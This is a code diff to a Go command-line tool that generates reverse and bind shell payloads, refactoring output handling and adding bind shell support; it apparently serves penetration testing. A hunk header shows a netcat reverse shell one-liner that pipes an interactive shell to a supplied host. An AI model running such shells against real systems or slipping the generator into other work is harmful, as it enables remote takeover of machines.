@@ -12,19 +12,19 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var PayloadHost string
-var PayloadPort string
-var PayloadLanguage string
-var PayloadForceFile bool
+var payloadHost string
+var payloadPort string
+var payloadLanguage string
+var payloadForceFile bool
 
 func init() {
 	rootCmd.AddCommand(payloadCmd)
 
-	payloadCmd.Flags().StringVarP(&PayloadHost, "address", "a", "", "Host IP used in payload")
-	payloadCmd.Flags().StringVarP(&PayloadPort, "port", "p", "4444", "Port used in the payload")
-	payloadCmd.Flags().StringVarP(&PayloadLanguage, "language", "l", "", "The language of the payload")
+	payloadCmd.Flags().StringVarP(&payloadHost, "address", "a", "", "Host IP used in payload")
+	payloadCmd.Flags().StringVarP(&payloadPort, "port", "p", "4444", "Port used in the payload")
+	payloadCmd.Flags().StringVarP(&payloadLanguage, "language", "l", "", "The language of the payload")
 
-	payloadCmd.Flags().BoolVarP(&PayloadForceFile, "forcefile", "f", false, "Force the output to be formatted in a file.")
+	payloadCmd.Flags().BoolVarP(&payloadForceFile, "forcefile", "f", false, "Force the output to be formatted in a file.")
 
 	payloadCmd.MarkFlagRequired("address")
 }
@@ -307,7 +307,7 @@ main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc <HOST> 
 	},
 }
 
-var bindShells = map[string]string{}
+var bindShells = map[string]shell{}
 
 var payloadCmd = &cobra.Command{
 	Use:   "payload [TYPE]",
@@ -319,7 +319,7 @@ var payloadCmd = &cobra.Command{
 			return
 		}
 
-		if len(PayloadLanguage) == 0 {
+		if len(payloadLanguage) == 0 {
 			keys := make([]string, 0, len(reverseShells))
 			for k, v := range reverseShells {
 				if v.AlwaysFile {
@@ -335,7 +335,7 @@ var payloadCmd = &cobra.Command{
 				Title:   "Choose a payload language",
 				Options: keys,
 				OnChoice: func(choice string) {
-					PayloadLanguage = choice
+					payloadLanguage = choice
 					genPayload(strings.ToLower(args[0]))
 				},
 				OnQuit: func() {
@@ -350,35 +350,45 @@ var payloadCmd = &cobra.Command{
 
 func genPayload(payloadType string) {
 	if payloadType == "reverseshell" || payloadType == "rs" {
-		if val, ok := reverseShells[strings.ToLower(PayloadLanguage)]; ok {
-			val.Payload = strings.Replace(strings.Replace(val.Payload, "<HOST>", PayloadHost, 1), "<PORT>", PayloadPort, 1)
-			if val.AlwaysFile {
-				// Output to file
-				if ex := writeToFile(val); ex == nil {
-					fmt.Println(utils.Green + "Result: " + utils.White + "payload." + val.Extension + utils.Reset)
-				}
-			} else {
-				if PayloadForceFile {
-					// Output to file
-					if ex := writeToFile(val); ex == nil {
-						fmt.Println(utils.Green + "Result: " + utils.White + "payload." + val.Extension + utils.Reset)
-					}
-				} else {
-					// Output to stdout
-					fmt.Println(utils.Green + "Result:\n" + utils.White + val.Payload + utils.Reset)
-				}
-			}
+		if val, ok := reverseShells[strings.ToLower(payloadLanguage)]; ok {
+			val.Payload = strings.Replace(strings.Replace(val.Payload, "<HOST>", payloadHost, 1), "<PORT>", payloadPort, 1)
+			outputPayload(&val)
 		} else {
-			fmt.Println(utils.Red + "Invalid payload language." + utils.Reset)
+			fmt.Println(utils.Red + "Invalid reverse shell language." + utils.Reset)
 		}
 	} else if payloadType == "bindshell" || payloadType == "bs" {
-		fmt.Println("Coming Soon!")
+		if val, ok := bindShells[strings.ToLower(payloadLanguage)]; ok {
+			val.Payload = strings.Replace(strings.Replace(val.Payload, "<HOST>", payloadHost, 1), "<PORT>", payloadPort, 1)
+			outputPayload(&val)
+		} else {
+			fmt.Println(utils.Red + "Invalid bind shell language." + utils.Reset)
+		}
 	} else {
-		fmt.Println(utils.Red + "Invalid payload type." + utils.Reset)
+		fmt.Println(utils.Red + "Invalid payload type. (Use: reverseshell/rs or bindshell/bs)" + utils.Reset)
 	}
 }
 
-func writeToFile(val shell) error {
+func outputPayload(val *shell) {
+	val.Payload = strings.Replace(strings.Replace(val.Payload, "<HOST>", payloadHost, 1), "<PORT>", payloadPort, 1)
+	if val.AlwaysFile {
+		// Output to file
+		if ex := writeToFile(val); ex == nil {
+			fmt.Println(utils.Green + "Result: " + utils.White + "payload." + val.Extension + utils.Reset)
+		}
+	} else {
+		if payloadForceFile {
+			// Output to file
+			if ex := writeToFile(val); ex == nil {
+				fmt.Println(utils.Green + "Result: " + utils.White + "payload." + val.Extension + utils.Reset)
+			}
+		} else {
+			// Output to stdout
+			fmt.Println(utils.Green + "Result:\n" + utils.White + val.Payload + utils.Reset)
+		}
+	}
+}
+
+func writeToFile(val *shell) error {
 	f, ex := os.Create("payload." + val.Extension)
 	if ex != nil {
 		fmt.Println(utils.Red + "Failed to create a file for the payload." + utils.Reset)
